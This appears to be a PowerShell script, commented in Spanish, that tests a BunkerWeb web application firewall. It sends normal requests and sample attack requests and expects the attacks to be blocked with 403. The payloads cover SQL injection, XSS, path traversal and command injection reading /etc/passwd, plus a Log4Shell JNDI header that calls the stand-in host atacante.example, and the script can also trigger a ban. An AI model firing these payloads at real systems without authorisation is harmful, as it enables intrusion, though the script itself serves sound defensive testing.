# =============================================================================
#  Lanza peticiones normales y ataques de prueba contra el WAF (PowerShell).
#
#  Uso:
#    .\pruebas.ps1                                   # contra app.localhost
#    .\pruebas.ps1 -Dominio miapp.duckdns.org        # contra un dominio real
#    .\pruebas.ps1 -Dominio app.localhost -IP 1.2.3.4
#    .\pruebas.ps1 -Baneo                            # además provoca un baneo
#
#  Si Windows bloquea el script, ejecútalo así:
#    powershell -ExecutionPolicy Bypass -File .\pruebas.ps1
#
#  Resultado esperado: peticiones normales -> 200, ataques -> 403.
# =============================================================================
param(
  [string]$Dominio = "app.localhost",
  [string]$IP = "127.0.0.1",
  [switch]$Baneo
)

# curl.exe viene incluido en Windows 10/11. Se usa "curl.exe" (y no "curl")
# porque en Windows PowerShell "curl" es un alias de Invoke-WebRequest.
if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
  Write-Host "No se encontró curl.exe. Actualiza Windows o instala curl." -ForegroundColor Red
  exit 1
}

$Base = "https://$Dominio"
# -k: acepta el certificado autofirmado   -g: no interpretar [] {} en la URL
$CurlBase = @("-skg", "-o", "NUL", "-w", "%{http_code}", "--max-time", "10",
              "--resolve", "${Dominio}:443:$IP")
$script:Fallos = 0

function Probar {
  param([string]$Esperado, [string]$Descripcion, [string[]]$Argumentos)
  $codigo = & curl.exe @CurlBase @Argumentos
  $color = if ($codigo -eq $Esperado) { "Green" } else { "Red" }
  if ($codigo -ne $Esperado) { $script:Fallos++ }
  Write-Host ("  {0,-4} " -f $codigo) -ForegroundColor $color -NoNewline
  Write-Host ("{0,-42} (esperado {1})" -f $Descripcion, $Esperado)
}

Write-Host "Objetivo: $Base  (IP $IP)"
Write-Host ""
Write-Host "Tráfico normal"
Probar "200" "Página principal"            @("$Base/")
Probar "200" "Parámetro normal"            @("$Base/productos?id=5&orden=precio")

Write-Host ""
Write-Host "Ataques (deben ser bloqueados)"
Probar "403" "Inyección SQL (GET)"         @("$Base/?id=1'%20OR%20'1'%3D'1")
Probar "403" "Inyección SQL (POST)"        @("-X", "POST", "-d", "usuario=admin'--&clave=x", "$Base/login")
Probar "403" "XSS"                         @("$Base/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
Probar "403" "Path traversal"              @("$Base/?archivo=../../../../etc/passwd")
Probar "403" "Inyección de comandos"       @("$Base/?cmd=%3Bcat%20/etc/passwd")
Probar "403" "Log4Shell en cabecera"       @("-H", 'X-Api-Version: ${jndi:ldap://atacante.example/a}', "$Base/")
Probar "403" "Escáner (User-Agent sqlmap)" @("-A", "sqlmap/1.8", "$Base/")

if ($Baneo) {
  Write-Host ""
  Write-Host "Provocando baneo por mal comportamiento (12 ataques seguidos)..."
  1..12 | ForEach-Object { & curl.exe @CurlBase "$Base/?id=1'%20OR%201=1--" | Out-Null }
  Start-Sleep -Seconds 2
  Probar "403" "Petición NORMAL tras el baneo" @("$Base/")
  Write-Host "  (El baneo dura BAD_BEHAVIOR_BAN_TIME segundos; ver .env)"
}

Write-Host ""
if ($script:Fallos -eq 0) {
  Write-Host "Todo según lo esperado. Revisa el dashboard en Grafana." -ForegroundColor Green
} else {
  Write-Host "$($script:Fallos) resultado(s) distinto(s) a lo esperado." -ForegroundColor Red
  Write-Host "Si todo da 403, puede que tu IP siga baneada de una prueba anterior: espera unos minutos."
  Write-Host "Si todo da 000, BunkerWeb no está respondiendo: docker compose logs bunkerweb"
}
